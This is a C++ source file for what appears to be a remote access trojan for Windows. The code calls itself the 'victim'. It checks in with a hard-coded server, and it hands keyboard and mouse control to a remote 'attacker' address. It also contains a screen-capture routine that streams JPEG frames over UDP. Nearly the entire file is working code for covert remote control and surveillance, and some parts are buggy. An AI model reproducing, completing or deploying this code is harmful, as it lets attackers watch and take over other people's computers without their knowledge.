#include <windows.h>
#include <iostream>
#include "wtypes.h"
#include <string>
#include <vector>
#include <turbojpeg.h>
#include <thread>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable : 4996)

#define SERVER "192.168.1.211"
#define BUFLEN 1024
#define PORT 8200
#define SCROLLDOWN 1  // 0 00 01
#define SCROLLUP 17   // 1 00 01
#define LEFTDOWN 5    // 0 01 01
#define LEFTUP 21     // 1 01 01
#define RIGHTDOWN 9   // 0 10 01
#define RIGHTUP 25    // 1 10 01
#define MIDDLEDOWN 13 // 0 11 01
#define MIDDLEUP 29   // 1 11 01

INPUT keyboard_input;
INPUT mouse_input;

struct sockaddr_in server_ip;
struct sockaddr_in current_attacker_ip;
struct sockaddr_in current_screen_ip;
struct sockaddr_in last_recieve_ip;

int s, slen = sizeof(server_ip);
char buf[BUFLEN];
char message[BUFLEN] = "victim";
WSADATA wsa;
int horizontal = 0;
int vertical = 0;

std::vector<BYTE> bmp_to_jpeg(const std::vector<BYTE>& bmpData, int width, int height, int quality) {
    // Create a TurboJPEG compressor object
    tjhandle tj = tjInitCompress();

    // Compress the BMP image to JPEG format
    unsigned char* bmpBuf = const_cast<unsigned char*>(bmpData.data());
    unsigned long bmpSize = bmpData.size();
    unsigned char* jpegBuf = NULL;
    unsigned long jpegSize = 0;
    int subsamp = TJSAMP_444; // Use 4:4:4 chrominance subsampling
    int flags = 0; // No additional flags
    tjCompress2(tj, bmpBuf, width, 0, height, TJPF_RGB, &jpegBuf, &jpegSize, subsamp, quality, flags);

    // Copy the compressed JPEG data to a vector
    std::vector<BYTE> jpegData(jpegSize);
    std::memcpy(jpegData.data(), jpegBuf, jpegSize);

    // Free the TurboJPEG compressor object and JPEG buffer
    tjFree(jpegBuf);
    tjDestroy(tj);

    // Return the compressed JPEG data
    return jpegData;
}

std::vector<BYTE> get_data_to_send() {
    int x = 0, y = 0, w = 1920, h = 1080;
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bmp = CreateCompatibleBitmap(screen_dc, w, h);
    HGDIOBJ old_bmp = SelectObject(mem_dc, bmp);
    BitBlt(mem_dc, 0, 0, w, h, screen_dc, x, y, SRCCOPY);
    std::vector<BYTE> bmp_data(w * h * 3); // Each pixel is 4 bytes (32 bits)
    BITMAPINFOHEADER bmp_info_header = { sizeof(BITMAPINFOHEADER), w, h, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };
    GetDIBits(mem_dc, bmp, 0, h, bmp_data.data(), reinterpret_cast<BITMAPINFO*>(&bmp_info_header), DIB_RGB_COLORS);
    std::vector<BYTE> jpeg_data = bmp_to_jpeg(bmp_data, 1920, 1080, 30); // Convert BMP to JPEG    
    SelectObject(mem_dc, old_bmp);
    DeleteObject(bmp);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    return jpeg_data;
}

void SendScreenData() {
    Sleep(1000);
    while (true) {
        std::vector<BYTE> jpeg_data = get_data_to_send();
        sendto(s, reinterpret_cast<const char*>(jpeg_data.data()), 65000, 0, (struct sockaddr*)&current_screen_ip, slen);
        Sleep(5);
        sendto(s, reinterpret_cast<const char*>(jpeg_data.data()) + 65000, jpeg_data.size() - 65000, 0, (struct sockaddr*)&current_screen_ip, slen);
        Sleep(5);
    }
}

void GetDesktopResolution()
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    horizontal = desktop.right;
    vertical = desktop.bottom;
};

void move_cursor(int x_percent, int y_percent) {
    SetCursorPos(x_percent * horizontal / 100, y_percent * vertical / 100);
};

void press_key(int code) { //https://help.mjtnet.com/article/262-virtual-key-codes for codes
    keyboard_input.ki.wVk = code;
    keyboard_input.ki.dwFlags = 0;
    SendInput(1, &keyboard_input, sizeof(INPUT));


};

void release_key(int code) {
    keyboard_input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &keyboard_input, sizeof(INPUT));
};

void handle_input(int packet_int) {
    if (!(packet_int & 1)) { // keyboard event when uts a 0  
        packet_int /= 2; // ignore the first bit that represented the fact its a keyboard event
        if (!(packet_int & 1)) {
            press_key(packet_int / 2);
        }
        else {
            release_key(packet_int / 2);
        }
    }
    else { //mouse event
        if ((packet_int & 3) == 3) {
            packet_int /= 4; // ignore the first 2 bits that represented the type
            int guide_number = 128; //2^amount of bits per persentage
            int x_percentage = packet_int & (guide_number - 1);
            int y_percentage = packet_int / guide_number;
            move_cursor(x_percentage, y_percentage);
            Sleep(1);
            return;
        }
        switch (packet_int) {
        case (SCROLLDOWN):
            mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            mouse_input.mi.mouseData = -120;
            break;
        case (SCROLLUP):
            mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            mouse_input.mi.mouseData = 120;
            break;
        case (LEFTDOWN):
            mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            break;
        case (LEFTUP):
            mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
            break;
        case (RIGHTDOWN):
            mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            break;
        case (RIGHTUP):
            mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            break;
        case (MIDDLEDOWN):
            mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
            break;
        case (MIDDLEUP):
            mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
            break;
        default:
            return;
        }
        SendInput(1, &mouse_input, sizeof(INPUT));
        mouse_input.mi.mouseData = 0;
    }
    Sleep(1); // 1ms delay not to have race in case 1 event takes longer to exec then another

};
bool is_same_ip(sockaddr_in ip1, sockaddr_in ip2) {
    return (ip1.sin_port == ip2.sin_port && ip1.sin_addr.S_un.S_addr == ip2.sin_addr.S_un.S_addr);
};
void handle_packet(char buf[]) { //todo current_screen_ip make it work
    if (is_same_ip(last_recieve_ip, server_ip)) { // https://www.digitalocean.com/community/tutorials/convert-string-to-char-array-c-plus-plus
        std::string x = buf;
        int index_of_space = x.find(" ");
        std::string ip = x.substr(0, index_of_space);
        std::string port = x.substr(index_of_space + 1, x.length() - (index_of_space + 1));
        char char_of_ip[16];
        strcpy(char_of_ip, ip.c_str());
        char_of_ip[ip.length()] = '\0';
        current_attacker_ip.sin_addr.S_un.S_addr = inet_addr(char_of_ip);
        current_attacker_ip.sin_port = htons(std::stoi(port));
        current_screen_ip.sin_addr.S_un.S_addr = inet_addr(char_of_ip);
        strcpy(message, std::string("hello i am ur victim").c_str());
        if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&current_attacker_ip, slen) == SOCKET_ERROR) {
            std::cout << "fail3" << std::endl;
        }
        //std::thread t(SendScreenData);
    }
    else if (is_same_ip(last_recieve_ip, current_attacker_ip)) {
        int packet_as_int = (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]);
        // translate from little indian binary to int
        handle_input(packet_as_int);
    }

};

int main()
{
    //--------------------- some basic setup ----------------------------
    GetDesktopResolution();
    //------------------------ socket setup -----------------------------

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "error smthg" << std::endl;
        return -1;

    }
    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) {
        std::cout << "error 2" << std::endl;
        return -1;
    }
    memset((char*)&server_ip, 0, sizeof(server_ip));
    server_ip.sin_family = AF_INET;
    current_attacker_ip.sin_family = AF_INET;
    last_recieve_ip.sin_family = AF_INET;
    current_screen_ip.sin_family = AF_INET;
    current_screen_ip.sin_port = htons(8201);
    server_ip.sin_port = htons(PORT);
    server_ip.sin_addr.S_un.S_addr = inet_addr(SERVER);
    if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&server_ip, slen) == SOCKET_ERROR) {
        std::cout << "fail3" << std::endl;
        return -1;
    }
    // ------------------------------------------------------------------
    //--------------------- keyboard input setup ------------------------
    keyboard_input.type = INPUT_KEYBOARD;
    keyboard_input.ki.wScan = 0;
    keyboard_input.ki.time = 0;
    keyboard_input.ki.dwExtraInfo = 0;
    //-------------------------------------------------------------------
    //---------------------- mouse input setup --------------------------
    mouse_input.type = INPUT_MOUSE;
    mouse_input.mi.mouseData = 0;
    mouse_input.mi.time = 0;
    //-------------------------------------------------------------------


    while (true) {
        memset(buf, '\0', BUFLEN);
        if (recvfrom(s, buf, BUFLEN, 0, (struct sockaddr*)&last_recieve_ip, &slen) == SOCKET_ERROR) {
            std::cout << "error reciving" << std::endl;
            return -1;
        }
        handle_packet(buf);
    }

    // ---------------------- end of code stuff -------------------------
    closesocket(s);
    WSACleanup();
    return 0;
}